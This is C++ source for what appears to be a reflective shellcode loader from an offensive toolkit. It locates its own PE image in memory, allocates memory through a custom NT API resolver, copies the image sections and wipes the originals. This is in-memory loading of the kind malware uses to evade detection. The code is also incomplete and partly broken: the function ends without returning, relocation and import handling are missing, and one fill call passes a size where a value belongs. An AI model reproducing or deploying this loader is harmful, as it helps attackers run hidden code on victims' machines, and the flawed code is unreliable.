#include "../headers/reflection.h"
#include "utils/headers/CRTdefs.h"

#include "intrin.h"

void* ReflectiveShellcodeLdr(void* pParam, API::APIResolver &resolver)
{
	DLL_MAIN	      DllMain			= { 0 }; // Function pointer to dllmain
	ULONG_PTR		  uDllAddress		= 0;
	void			 *pInjectionAddress = nullptr;
	PIMAGE_NT_HEADERS pImgNtHdrs		= nullptr;
	size_t		      uImageSize		= 0;

	auto api = resolver.GetAPIAccess();

	

	uDllAddress = reinterpret_cast<ULONG_PTR>(_ReturnAddress());

	do
	{
		if (((PIMAGE_DOS_HEADER)uDllAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(uDllAddress + reinterpret_cast<PIMAGE_DOS_HEADER>(uDllAddress)->e_lfanew);
			if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE)
				break;
		}
		uDllAddress++;
	} while (true);

	if (!pImgNtHdrs)
		return pInjectionAddress;

	uImageSize = pImgNtHdrs->OptionalHeader.SizeOfImage;

	if (!NT_SUCCESS(api.func.pNtAllocateVirtualMemory(
		NtCurrentProcess(),
		&pInjectionAddress,
		0,
		&uImageSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
	)))
		return pInjectionAddress;

	// Copy over sections
	PIMAGE_SECTION_HEADER pImgSectHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		__movsb(reinterpret_cast<PBYTE>(ULONG_PTR(pInjectionAddress) + pImgSectHdr[i].VirtualAddress), reinterpret_cast<const BYTE*>(ULONG_PTR(uDllAddress + pImgSectHdr[i].PointerToRawData)), pImgSectHdr[i].SizeOfRawData);
		__stosb(reinterpret_cast<PBYTE>(ULONG_PTR(uDllAddress + pImgSectHdr[i].PointerToRawData)), pImgSectHdr[i].SizeOfRawData, sizeof(pImgSectHdr[i].SizeOfRawData));
	}



}